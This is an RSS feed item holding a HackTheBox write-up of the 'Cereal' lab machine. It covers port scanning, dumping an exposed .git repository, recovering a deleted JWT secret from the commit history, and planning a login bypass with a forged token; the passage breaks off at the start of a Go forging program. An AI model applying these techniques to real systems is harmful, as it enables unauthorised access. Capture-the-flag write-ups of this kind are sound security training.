<?xml version="1.0" encoding="utf-8" standalone="yes"?>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom" xmlns:content="http://purl.org/rss/1.0/modules/content/">
  <channel>
    <title>Windows on Ef&#39;s log</title>
    <link>https://fahmifj.github.io/tags/windows/</link>
    <description>Recent content in Windows on Ef&#39;s log</description>
    <generator>Hugo -- gohugo.io</generator>
    <lastBuildDate>Wed, 09 Jun 2021 07:33:40 +0700</lastBuildDate><atom:link href="https://fahmifj.github.io/tags/windows/index.xml" rel="self" type="application/rss+xml" />
    <item>
      <title>HackTheBox - Cereal (User only)</title>
      <link>https://fahmifj.github.io/writeups/hackthebox/htb-cereal/</link>
      <pubDate>Wed, 09 Jun 2021 07:33:40 +0700</pubDate>
      
      <guid>https://fahmifj.github.io/writeups/hackthebox/htb-cereal/</guid>
      <description>Doing code reviews in order to chain XSS, SSRF, and Deserialization vulnerabilities to gain a foothold</description>
      <content:encoded><![CDATA[<p>Cereal is a hard difficulty Windows machine that features a misconfigured web server which exposes source code of the currently hosted web application. A deleted JWT secrets is found in the source code, which can be used to forge my own JWT token and bypass the application login page. After reviewing the source code, the web app is found to be vulnerable to a deserialization attack. There is also a XSS vulnerability in one of the package used by the application. Chaining these vulnerabilities allows me to gain a foothold in the system.</p>
<h3 id="skills-learned">Skills Learned</h3>
<ul>
<li>Code review</li>
<li>JWT authentication bypass</li>
<li>XSS exploitation</li>
<li>.NET deserialization</li>
</ul>
<h3 id="tools">Tools</h3>
<ul>
<li>Kali Linux 2019.4 (Attacking Machine) - <a href="https://www.kali.org/">https://www.kali.org/</a></li>
<li>Nmap - Preinstalled in Kali Linux</li>
</ul>
<h2 id="reconnaissance">Reconnaissance</h2>
<h3 id="nmap">Nmap</h3>
<p>All TCP ports scan with <code>nmap</code> discovers three open ports: SSH on port 22, HTTP on port 80, and HTTP on port 443.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">→ root@kali «cereal» «10.10.14.3» 
$ nmap -p- --min-rate <span style="color:#ae81ff">1000</span> --reason -oA nmap/10-tcp-allport-cereal 10.10.10.217
Starting Nmap 7.80 <span style="color:#f92672">(</span> https://nmap.org <span style="color:#f92672">)</span> at 2021-06-04 23:45 EDT

...&lt;SNIP&gt;...
PORT    STATE SERVICE REASON
22/tcp  open  ssh     syn-ack ttl <span style="color:#ae81ff">127</span>
80/tcp  open  http    syn-ack ttl <span style="color:#ae81ff">127</span>
443/tcp open  https   syn-ack ttl <span style="color:#ae81ff">127</span>

Nmap <span style="color:#66d9ef">done</span>: <span style="color:#ae81ff">1</span> IP address <span style="color:#f92672">(</span><span style="color:#ae81ff">1</span> host up<span style="color:#f92672">)</span> scanned in 118.08 seconds
</code></pre></div><p>I&rsquo;ll run another scan with <code>nmap</code> &rsquo;s default scripts.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">→ root@kali «cereal» «10.10.14.3» 
$ nmap -p 22,80,443 -sC -sV -oA nmap/10-tcp-allport-script 10.10.10.217
Starting Nmap 7.80 <span style="color:#f92672">(</span> https://nmap.org <span style="color:#f92672">)</span> at 2021-06-04 23:51 EDT

...&lt;SNIP&gt;...
PORT    STATE SERVICE  VERSION
22/tcp  open  ssh      OpenSSH for_Windows_7.7 <span style="color:#f92672">(</span>protocol 2.0<span style="color:#f92672">)</span>
| ssh-hostkey: 
|   <span style="color:#ae81ff">2048</span> 08:8e:fe:04:8c:ad:6f:df:88:c7:f3:9a:c5:da:6d:ac <span style="color:#f92672">(</span>RSA<span style="color:#f92672">)</span>
|   <span style="color:#ae81ff">256</span> fb:f5:7b:a1:68:07:c0:7b:73:d2:ad:33:df:0a:fc:ac <span style="color:#f92672">(</span>ECDSA<span style="color:#f92672">)</span>
|_  <span style="color:#ae81ff">256</span> cc:0e:70:ec:33:42:59:78:31:c0:4e:c2:a5:c9:0e:1e <span style="color:#f92672">(</span>ED25519<span style="color:#f92672">)</span>
80/tcp  open  http     Microsoft IIS httpd 10.0
|_http-server-header: Microsoft-IIS/10.0
|_http-title: Did not follow redirect to https://cereal.htb/
|_https-redirect: ERROR: Script execution failed <span style="color:#f92672">(</span>use -d to debug<span style="color:#f92672">)</span>
443/tcp open  ssl/http Microsoft IIS httpd 10.0
|_http-server-header: Microsoft-IIS/10.0
|_http-title: Cereal
| ssl-cert: Subject: commonName<span style="color:#f92672">=</span>cereal.htb
| Subject Alternative Name: DNS:cereal.htb, DNS:source.cereal.htb
| Not valid before: 2020-11-11T19:57:18
|_Not valid after:  2040-11-11T20:07:19
|_ssl-date: 2021-06-05T03:51:48+00:00; +5s from scanner time.
| tls-alpn: 
|_  http/1.1
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: 4s

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap <span style="color:#66d9ef">done</span>: <span style="color:#ae81ff">1</span> IP address <span style="color:#f92672">(</span><span style="color:#ae81ff">1</span> host up<span style="color:#f92672">)</span> scanned in 23.34 seconds
</code></pre></div><p>This time <code>nmap</code> found two hostnames from the SSL certificate: <code>cereal.htb</code> and <code>source.cereal.htb</code>.</p>
<p>I&rsquo;ll add those hostnames to my <code>/etc/hosts</code>:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">→ root@kali «cereal» «10.10.14.3» 
$ echo <span style="color:#e6db74">&#39;10.10.10.217 cereal.htb source.cereal.htb&#39;</span> &gt;&gt; /etc/hosts
</code></pre></div><h2 id="enumeration">Enumeration</h2>
<h3 id="tcp-80">TCP 80</h3>
<p>It redirects to the HTTPS.</p>
<h3 id="tcp-443---cerealhtb">TCP 443 - cereal.htb</h3>
<p>Following the redirection ends up at a login form.</p>
<p><img class="img-container" src="imgs/image-20210605110703967.png" alt="image-20210605110703967"  />
</p>
<p>I tried a few common credentials but doesn&rsquo;t seem to work here.</p>
<p>Inspecting the source reveals that this site is a react based application.</p>
<p><img class="img-container" src="imgs/image-20210609080804206.png" alt="image-20210609080804206"  />
</p>
<p>If I track down the authentication process, this site store the authentication data in browser&rsquo;s local storage with a key name of <code>currentUser</code>.</p>
<p><img class="img-container" src="imgs/image-20210609082429730.png" alt="image-20210609082429730"  />
</p>
<p>But l&rsquo;ll leave it for now.</p>
<p>I also did a gobuster scan, but didn&rsquo;t find anything useful.</p>
<h3 id="tcp-443---sourcecerealhtb">TCP 443 - source.cereal.htb</h3>
<p>Visiting <code>source.cereal.htb</code> shows a server error message of an ASP.net application:</p>
<p><img class="img-container" src="imgs/image-20210605111410148.png" alt="image-20210605111410148"  />
</p>
<p>Nothing I can do on this page, but I&rsquo;ll take note on the leaked file path:</p>
<ul>
<li><code>C:\inetpub\source\default.aspx</code></li>
</ul>
<h4 id="gobuster">Gobuster</h4>
<p><code>gobuster</code> scan discovers a git repository, and there is also an upload directory.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">→ root@kali «cereal» «10.10.14.3» 
$ gobuster dir -u https://source.cereal.htb -k -w /opt/SecLists/Discovery/Web-Content/common.txt -x aspx,txt
<span style="color:#f92672">===============================================================</span>
Gobuster v3.1.0
by OJ Reeves <span style="color:#f92672">(</span>@TheColonial<span style="color:#f92672">)</span> &amp; Christian Mehlmauer <span style="color:#f92672">(</span>@firefart<span style="color:#f92672">)</span>
<span style="color:#f92672">===============================================================</span>
<span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Url:                     https://source.cereal.htb
<span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Method:                  GET
<span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Threads:                 <span style="color:#ae81ff">10</span>
<span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Wordlist:                /opt/SecLists/Discovery/Web-Content/common.txt
<span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Negative Status codes:   <span style="color:#ae81ff">404</span>
<span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> User Agent:              gobuster/3.1.0
<span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Extensions:              aspx,txt
<span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Timeout:                 10s
<span style="color:#f92672">===============================================================</span>
2021/06/05 00:52:32 Starting gobuster in directory enumeration mode
<span style="color:#f92672">===============================================================</span>
/.git/HEAD            <span style="color:#f92672">(</span>Status: 200<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>Size: 23<span style="color:#f92672">]</span>
/Default.aspx         <span style="color:#f92672">(</span>Status: 500<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>Size: 10090<span style="color:#f92672">]</span>
/aspnet_client        <span style="color:#f92672">(</span>Status: 301<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>Size: 163<span style="color:#f92672">]</span> <span style="color:#f92672">[</span>--&gt; https://source.cereal.htb/aspnet_client/<span style="color:#f92672">]</span>
/default.aspx         <span style="color:#f92672">(</span>Status: 500<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>Size: 9727<span style="color:#f92672">]</span>                                              
/uploads              <span style="color:#f92672">(</span>Status: 301<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>Size: 157<span style="color:#f92672">]</span> <span style="color:#f92672">[</span>--&gt; https://source.cereal.htb/uploads/<span style="color:#f92672">]</span>      
                                                                                              
<span style="color:#f92672">===============================================================</span>
2021/06/05 00:54:41 Finished
<span style="color:#f92672">===============================================================</span>
</code></pre></div><p>Accessing the <code>.git</code> and the <code>uploads</code> directory are forbidden.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">→ root@kali «cereal» «10.10.14.3» 
$ curl -I -k http://source.cereal.htb/.git/ <span style="color:#f92672">&amp;&amp;</span> curl -I -k http://source.cereal.htb/uploads/
HTTP/1.1 <span style="color:#ae81ff">403</span> Forbidden
Content-Length: <span style="color:#ae81ff">1233</span>
Content-Type: text/html
Server: Microsoft-IIS/10.0
X-Powered-By: Sugar
Date: Sat, <span style="color:#ae81ff">05</span> Jun <span style="color:#ae81ff">2021</span> 05:01:25 GMT

HTTP/1.1 <span style="color:#ae81ff">403</span> Forbidden
Content-Length: <span style="color:#ae81ff">1233</span>
Content-Type: text/html
Server: Microsoft-IIS/10.0
X-Powered-By: Sugar
Date: Sat, <span style="color:#ae81ff">05</span> Jun <span style="color:#ae81ff">2021</span> 05:08:16 GMT
</code></pre></div><p>But requesting files under <code>.git</code> directory are allowed.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">→ root@kali «cereal» «10.10.14.3» 
$ curl -I -k http://source.cereal.htb/.git/HEAD
HTTP/1.1 <span style="color:#ae81ff">200</span> OK
Content-Length: <span style="color:#ae81ff">23</span>
Content-Type: text/plain
Last-Modified: Wed, <span style="color:#ae81ff">11</span> Nov <span style="color:#ae81ff">2020</span> 20:09:34 GMT
Accept-Ranges: bytes
ETag: <span style="color:#e6db74">&#34;adc1d19266b8d61:0&#34;</span>
Server: Microsoft-IIS/10.0
X-Powered-By: Sugar
Date: Sat, <span style="color:#ae81ff">05</span> Jun <span style="color:#ae81ff">2021</span> 05:01:29 GMT

→ root@kali «cereal» «10.10.14.3» 
$ curl -s -k http://source.cereal.htb/.git/HEAD
ref: refs/heads/master
</code></pre></div><p>I&rsquo;ll note the <code>uploads</code> directory</p>
<h3 id="git">Git</h3>
<h4 id="dumping-git-directory">Dumping .git directory</h4>
<p>With <a href="https://github.com/arthaud/git-dumper">git-dumper</a>, I could get all the files in that <code>.git</code> directory.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">→ root@kali «cereal» «10.10.14.3» 
$ mkdir loot/source-cereal-git <span style="color:#f92672">&amp;&amp;</span> ./git-dumper.py https://source.cereal.htb/.git loot/source-cereal-git 
<span style="color:#f92672">[</span>-<span style="color:#f92672">]</span> Testing https://source.cereal.htb/.git/HEAD <span style="color:#f92672">[</span>200<span style="color:#f92672">]</span>
<span style="color:#f92672">[</span>-<span style="color:#f92672">]</span> Testing https://source.cereal.htb/.git/ <span style="color:#f92672">[</span>403<span style="color:#f92672">]</span>
<span style="color:#f92672">[</span>-<span style="color:#f92672">]</span> Fetching common files
<span style="color:#f92672">[</span>-<span style="color:#f92672">]</span> Fetching https://source.cereal.htb/.gitignore <span style="color:#f92672">[</span>404<span style="color:#f92672">]</span>
<span style="color:#f92672">[</span>-<span style="color:#f92672">]</span> Fetching https://source.cereal.htb/.git/hooks/applypatch-msg.sample <span style="color:#f92672">[</span>404<span style="color:#f92672">]</span>
<span style="color:#f92672">[</span>-<span style="color:#f92672">]</span> Fetching https://source.cereal.htb/.git/COMMIT_EDITMSG <span style="color:#f92672">[</span>200<span style="color:#f92672">]</span>
<span style="color:#f92672">[</span>-<span style="color:#f92672">]</span> Fetching https://source.cereal.htb/.git/description <span style="color:#f92672">[</span>200<span style="color:#f92672">]</span>
...&lt;SNIP&gt;...
<span style="color:#f92672">[</span>-<span style="color:#f92672">]</span> Finding refs/
<span style="color:#f92672">[</span>-<span style="color:#f92672">]</span> Fetching https://source.cereal.htb/.git/ORIG_HEAD <span style="color:#f92672">[</span>404<span style="color:#f92672">]</span>
<span style="color:#f92672">[</span>-<span style="color:#f92672">]</span> Fetching https://source.cereal.htb/.git/config <span style="color:#f92672">[</span>200<span style="color:#f92672">]</span>
<span style="color:#f92672">[</span>-<span style="color:#f92672">]</span> Fetching https://source.cereal.htb/.git/FETCH_HEAD <span style="color:#f92672">[</span>404<span style="color:#f92672">]</span>
<span style="color:#f92672">[</span>-<span style="color:#f92672">]</span> Fetching https://source.cereal.htb/.git/HEAD <span style="color:#f92672">[</span>200<span style="color:#f92672">]</span>
...&lt;SNIP&gt;...
<span style="color:#f92672">[</span>-<span style="color:#f92672">]</span> Finding packs
<span style="color:#f92672">[</span>-<span style="color:#f92672">]</span> Finding objects
<span style="color:#f92672">[</span>-<span style="color:#f92672">]</span> Fetching objects
<span style="color:#f92672">[</span>-<span style="color:#f92672">]</span> Fetching https://source.cereal.htb/.git/objects/8f/2a1a88f15b9109e1f63e4e4551727bfb38eee5 <span style="color:#f92672">[</span>200<span style="color:#f92672">]</span>
...&lt;SNIP&gt;...
<span style="color:#f92672">[</span>-<span style="color:#f92672">]</span> Running git checkout .
</code></pre></div><h4 id="git-history">Git History</h4>
<p>I could see the history of this repository by issuing <code>git log</code>.</p>
<p><img class="img-container" src="imgs/image-20210605121727689.png" alt="image-20210605121727689"  />
</p>
<p>Aside from the author&rsquo;s names, one commit with the message &ldquo;Security fixes&rdquo; caught my attention.</p>
<p>I immediately run <code>git diff 8f2a 7bd9</code> to compare the first commit with the security fixes and that reveals a deleted JWT secret.</p>
<p><img class="img-container" src="imgs/image-20210609090452619.png" alt="image-20210609090452619"  />
</p>
<p>It looks like the security fixes include prevention against deserialization attacks which I&rsquo;ll note that as well as the secret:</p>
<ul>
<li>JWT secret: <code>secretlhfIH&amp;FY*#oysuflkhskjfhefesf</code></li>
</ul>
<h3 id="source-code-analysis-1">Source Code Analysis #1</h3>
<blockquote>
<p>I pointed my sh*tty explanation or at least how I understand it with <code>// &lt;==</code> or  <code># &lt;==</code> in the code snippet. Please, don&rsquo;t bully me for this.</p>
</blockquote>
<h4 id="app-overview">App Overview</h4>
<p>The app consist of ASP.NET (back-end)  and React (front-end).</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">→ root@kali «source-cereal-git» «10.10.14.3» git:<span style="color:#f92672">(</span>master<span style="color:#f92672">)</span> 
$ tree -L <span style="color:#ae81ff">1</span> --dirsfirst
.
├── ClientApp
├── Controllers
├── Migrations
├── Models
├── Pages
├── Properties
├── Services
├── ApplicationOptions.cs
├── appsettings.Development.json
├── appsettings.json
├── CerealContext.cs
├── Cereal.csproj
├── DownloadHelper.cs
├── ExtensionMethods.cs
├── IPAddressHandler.cs
├── IPRequirement.cs
├── Program.cs
└── Startup.cs
</code></pre></div><p>The source code of previously seen React app at <code>cereal.htb</code> is on the ClientApp folder.</p>
<p>Here is the overview of app execution flow:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-text" data-lang="text">Program.cs
 |
 v
Startup.cs  -&gt; Loads appsettings.json
 |
 v
React client
</code></pre></div><p>Looking into the <code>appsettings.js</code>, I could obtain the following information:</p>
<ul>
<li>There is IP whitelist</li>
<li>There are two rules that looks like limiting requests and it&rsquo;ll reset after certain period. One of them is limiting a post request to an endpoint called <code>/requests</code>.</li>
</ul>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-json" data-lang="json">{
<span style="color:#960050;background-color:#1e0010">...&lt;SNIP&gt;...</span>
  <span style="color:#f92672">&#34;AllowedHosts&#34;</span>: <span style="color:#e6db74">&#34;*&#34;</span>,
  <span style="color:#f92672">&#34;ApplicationOptions&#34;</span>: {
    <span style="color:#f92672">&#34;Whitelist&#34;</span>: [ <span style="color:#e6db74">&#34;127.0.0.1&#34;</span>, <span style="color:#e6db74">&#34;::1&#34;</span> ]
  },
  <span style="color:#f92672">&#34;IpRateLimiting&#34;</span>: {
    <span style="color:#f92672">&#34;EnableEndpointRateLimiting&#34;</span>: <span style="color:#66d9ef">true</span>,
    <span style="color:#f92672">&#34;StackBlockedRequests&#34;</span>: <span style="color:#66d9ef">false</span>,
    <span style="color:#f92672">&#34;RealIpHeader&#34;</span>: <span style="color:#e6db74">&#34;X-Real-IP&#34;</span>,
    <span style="color:#f92672">&#34;ClientIdHeader&#34;</span>: <span style="color:#e6db74">&#34;X-ClientId&#34;</span>,
    <span style="color:#f92672">&#34;HttpStatusCode&#34;</span>: <span style="color:#ae81ff">429</span>,
    <span style="color:#f92672">&#34;IpWhitelist&#34;</span>: [ <span style="color:#e6db74">&#34;127.0.0.1&#34;</span>, <span style="color:#e6db74">&#34;::1&#34;</span> ],
    <span style="color:#f92672">&#34;EndpointWhitelist&#34;</span>: [],
    <span style="color:#f92672">&#34;ClientWhitelist&#34;</span>: [],
    <span style="color:#f92672">&#34;GeneralRules&#34;</span>: [
      {
        <span style="color:#f92672">&#34;Endpoint&#34;</span>: <span style="color:#e6db74">&#34;post:/requests&#34;</span>,
        <span style="color:#f92672">&#34;Period&#34;</span>: <span style="color:#e6db74">&#34;5m&#34;</span>,
        <span style="color:#f92672">&#34;Limit&#34;</span>: <span style="color:#ae81ff">2</span>
      },
      {
        <span style="color:#f92672">&#34;Endpoint&#34;</span>: <span style="color:#e6db74">&#34;*&#34;</span>,
        <span style="color:#f92672">&#34;Period&#34;</span>: <span style="color:#e6db74">&#34;5m&#34;</span>,
        <span style="color:#f92672">&#34;Limit&#34;</span>: <span style="color:#ae81ff">150</span>
      }
    ]
  }
}

</code></pre></div><h4 id="authentication-vulnerability">Authentication Vulnerability</h4>
<p>Looking into the <code>Startup.cs</code> file, I could see there is a potential authentication bypass. On the following code snippet, the application clearly doesn&rsquo;t validate the issuer and the audience of a JWT token, and <a href="https://curity.io/resources/learn/jwt-best-practices/#4-always-check-the-issuer">this can raise a security issue</a>.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-csharp" data-lang="csharp">...&lt;SNIP&gt;...
    <span style="color:#66d9ef">var</span> key = Encoding.ASCII.GetBytes(<span style="color:#e6db74">&#34;*&#34;</span>);
    services.AddAuthentication(x =&gt;
    {
        x.DefaultAuthenticateScheme = JwtBearerDefaults.AuthenticationScheme;
        x.DefaultChallengeScheme = JwtBearerDefaults.AuthenticationScheme;
    })
    .AddJwtBearer(x =&gt;
    {
        x.RequireHttpsMetadata = <span style="color:#66d9ef">false</span>;
        x.SaveToken = <span style="color:#66d9ef">true</span>;
        x.TokenValidationParameters = <span style="color:#66d9ef">new</span> TokenValidationParameters
        {
            ValidateIssuerSigningKey = <span style="color:#66d9ef">true</span>,
            IssuerSigningKey = <span style="color:#66d9ef">new</span> SymmetricSecurityKey(key),
            ValidateIssuer = <span style="color:#66d9ef">false</span>, <span style="color:#75715e">// &lt;== No validation
</span><span style="color:#75715e"></span>            ValidateAudience = <span style="color:#66d9ef">false</span> <span style="color:#75715e">// &lt;== No validation
</span><span style="color:#75715e"></span>        };
    });
...&lt;SNIP&gt;...
</code></pre></div><p>The JWT token itself is forged at <code>Services/UserService.cs</code>:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-csharp" data-lang="csharp"><span style="color:#66d9ef">public</span> User Authenticate(<span style="color:#66d9ef">string</span> username, <span style="color:#66d9ef">string</span> password)
        {
            <span style="color:#66d9ef">using</span> (<span style="color:#66d9ef">var</span> db = <span style="color:#66d9ef">new</span> CerealContext())
            {
                <span style="color:#66d9ef">var</span> user = db.Users.Where(x =&gt; x.Username == username &amp;&amp; x.Password == password).SingleOrDefault();

                <span style="color:#75715e">// return null if user not found
</span><span style="color:#75715e"></span>                <span style="color:#66d9ef">if</span> (user == <span style="color:#66d9ef">null</span>)
                    <span style="color:#66d9ef">return</span> <span style="color:#66d9ef">null</span>;

                <span style="color:#75715e">// authentication successful so generate jwt token
</span><span style="color:#75715e"></span>                <span style="color:#66d9ef">var</span> tokenHandler = <span style="color:#66d9ef">new</span> JwtSecurityTokenHandler();
                <span style="color:#66d9ef">var</span> key = Encoding.ASCII.GetBytes(<span style="color:#e6db74">&#34;*&#34;</span>);
                <span style="color:#66d9ef">var</span> tokenDescriptor = <span style="color:#66d9ef">new</span> SecurityTokenDescriptor
                {
                    Subject = <span style="color:#66d9ef">new</span> ClaimsIdentity(<span style="color:#66d9ef">new</span> Claim[]
                    {
                        <span style="color:#66d9ef">new</span> Claim(ClaimTypes.Name, user.UserId.ToString())
                    }),
                    Expires = DateTime.UtcNow.AddDays(<span style="color:#ae81ff">7</span>),
                    SigningCredentials = <span style="color:#66d9ef">new</span> SigningCredentials(<span style="color:#66d9ef">new</span> SymmetricSecurityKey(key), SecurityAlgorithms.HmacSha256Signature)
                };
                <span style="color:#66d9ef">var</span> token = tokenHandler.CreateToken(tokenDescriptor);
                user.Token = tokenHandler.WriteToken(token);

                <span style="color:#66d9ef">return</span> user.WithoutPassword();
            }
</code></pre></div><p>When the user attempts to authenticate, the code snippet above checks to see if the user&rsquo;s credentials match those in the database. If the credentials match, the app will generate a JWT token for that user.</p>
<p>The user model is defined in here <code>Models/User.cs</code>. From here, I can assume each JWT token contains at least a user&rsquo;s ID, expiration time (7 days), Username, and Token.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-csharp" data-lang="csharp">...&lt;SNIP&gt;...
    <span style="color:#66d9ef">public</span> <span style="color:#66d9ef">class</span> <span style="color:#a6e22e">User</span>
    {
<span style="color:#a6e22e">        [Key]</span>
        <span style="color:#66d9ef">public</span> <span style="color:#66d9ef">int</span> UserId { <span style="color:#66d9ef">get</span>; <span style="color:#66d9ef">set</span>; }
<span style="color:#a6e22e">        [Required]</span>
        <span style="color:#66d9ef">public</span> <span style="color:#66d9ef">string</span> Username { <span style="color:#66d9ef">get</span>; <span style="color:#66d9ef">set</span>; }
<span style="color:#a6e22e">        [Required]</span>
        <span style="color:#66d9ef">public</span> <span style="color:#66d9ef">string</span> Password { <span style="color:#66d9ef">get</span>; <span style="color:#66d9ef">set</span>; }
        <span style="color:#66d9ef">public</span> <span style="color:#66d9ef">string</span> Token { <span style="color:#66d9ef">get</span>; <span style="color:#66d9ef">set</span>; }
    }
...&lt;SNIP&gt;...
</code></pre></div><p>Interestingly, in <code>ClientApp/src/LoginPage/LoginPage.jsx</code>, the authentication process doesn&rsquo;t look like it needs server/back-end validation, because it checks the browser&rsquo;s local storage first.</p>
<blockquote>
<p>It&rsquo;ll ask the server if we press the login button (POST request).</p>
</blockquote>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-javascript" data-lang="javascript">...<span style="color:#f92672">&lt;</span><span style="color:#a6e22e">SNIP</span><span style="color:#f92672">&gt;</span>...
<span style="color:#66d9ef">import</span> { <span style="color:#a6e22e">authenticationService</span> } <span style="color:#a6e22e">from</span> <span style="color:#e6db74">&#39;../_services&#39;</span>; <span style="color:#75715e">// &lt;==
</span><span style="color:#75715e"></span>
<span style="color:#66d9ef">class</span> <span style="color:#a6e22e">LoginPage</span> <span style="color:#66d9ef">extends</span> <span style="color:#a6e22e">React</span>.<span style="color:#a6e22e">Component</span> {
    <span style="color:#a6e22e">constructor</span>(<span style="color:#a6e22e">props</span>) {
        <span style="color:#66d9ef">super</span>(<span style="color:#a6e22e">props</span>);

        <span style="color:#75715e">// redirect to home if already logged in
</span><span style="color:#75715e"></span>        <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">authenticationService</span>.<span style="color:#a6e22e">currentUserValue</span>) {  <span style="color:#75715e">// &lt;==
</span><span style="color:#75715e"></span>            <span style="color:#66d9ef">this</span>.<span style="color:#a6e22e">props</span>.<span style="color:#a6e22e">history</span>.<span style="color:#a6e22e">push</span>(<span style="color:#e6db74">&#39;/&#39;</span>); 
        }
    }

    <span style="color:#a6e22e">render</span>() {
        <span style="color:#66d9ef">return</span> (
            <span style="color:#f92672">&lt;</span><span style="color:#a6e22e">div</span><span style="color:#f92672">&gt;</span>
                <span style="color:#f92672">&lt;</span><span style="color:#a6e22e">h2</span><span style="color:#f92672">&gt;</span><span style="color:#a6e22e">Login</span><span style="color:#f92672">&lt;</span><span style="color:#960050;background-color:#1e0010">/h2&gt;</span>
...<span style="color:#f92672">&lt;</span><span style="color:#a6e22e">SNIP</span><span style="color:#f92672">&gt;</span>...
</code></pre></div><p>I could track the <code>authenticationService.currentUserValue</code> and it is defined in  <code>ClientApp/src/_services/authentication.service.jsx</code></p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-javascript" data-lang="javascript"><span style="color:#66d9ef">const</span> <span style="color:#a6e22e">currentUserSubject</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> <span style="color:#a6e22e">BehaviorSubject</span>(<span style="color:#a6e22e">JSON</span>.<span style="color:#a6e22e">parse</span>(<span style="color:#a6e22e">localStorage</span>.<span style="color:#a6e22e">getItem</span>(<span style="color:#e6db74">&#39;currentUser&#39;</span>))); <span style="color:#75715e">// &lt;==
</span><span style="color:#75715e"></span>
<span style="color:#66d9ef">export</span> <span style="color:#66d9ef">const</span> <span style="color:#a6e22e">authenticationService</span> <span style="color:#f92672">=</span> {
    <span style="color:#a6e22e">login</span>,
    <span style="color:#a6e22e">logout</span>,
    <span style="color:#a6e22e">currentUser</span><span style="color:#f92672">:</span> <span style="color:#a6e22e">currentUserSubject</span>.<span style="color:#a6e22e">asObservable</span>(),<span style="color:#75715e">// &lt;==
</span><span style="color:#75715e"></span>    <span style="color:#a6e22e">get</span> <span style="color:#a6e22e">currentUserValue</span> () { <span style="color:#66d9ef">return</span> <span style="color:#a6e22e">currentUserSubject</span>.<span style="color:#a6e22e">value</span> } <span style="color:#75715e">// &lt;==
</span><span style="color:#75715e"></span>};
</code></pre></div><h3 id="authentication-bypass">Authentication Bypass</h3>
<p>I could summarize the previous code analysis to these points:</p>
<ul>
<li>As long as the browser&rsquo;s local storage contains a key of <code>currentUser</code> which has JWT token in its value, the client app will logs the user in.</li>
<li>No other validation in JWT token except the user&rsquo;s ID and expires date. (based on <code>Services/UserService.cs</code>)</li>
<li>Based on  <code>Models/User.cs</code>,  <code>Services/UserService.cs</code>, and  <code>ClientApp/src/_services/auth-header.js</code> , the form of <code>currentUser</code> is something like this:
<ul>
<li><code>&quot;currentUser&quot; : &quot;{ &quot;userId&quot;: &quot;0&quot;, &quot;username&quot;: &quot;name&quot;, &quot;token&quot;: &quot;JWT token&quot;}&quot;</code>.</li>
</ul>
</li>
</ul>
<h4 id="tactics">Tactics</h4>
<p>Here is the tactics to bypass the login page:</p>
<ul>
<li>Since there is no validation on the issuer, and I have the JWT secret key, I could forge my own JWT.</li>
<li>I&rsquo;ll put the forged JWT token to browser&rsquo;s local storage of <code>cereal.htb</code> with the key name of <code>currentUser</code>.</li>
<li>Simply refresh the page afterwards and see if it logs me in.</li>
</ul>
<h4 id="forge-jwt">Forge JWT</h4>
<p>To forge our own JWT, you could try <a href="https://github.com/ticarpi/jwt_tool">jwtool</a>, but I tried to forge my own JWT using Golang lol.</p>
<p>Here is the code:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-go" data-lang="go"><span style="color:#f92672">package</span> <span style="color:#a6e22e">main</span>

<span style="color:#f92672">import</span> (
	<span style="color:#e6db74">&#34;encoding/json&#34;</span>
	<span style="color:#e6db74">&#34;fmt&#34;</span>
	<span style="color:#e6db74">&#34;time&#34;</span>

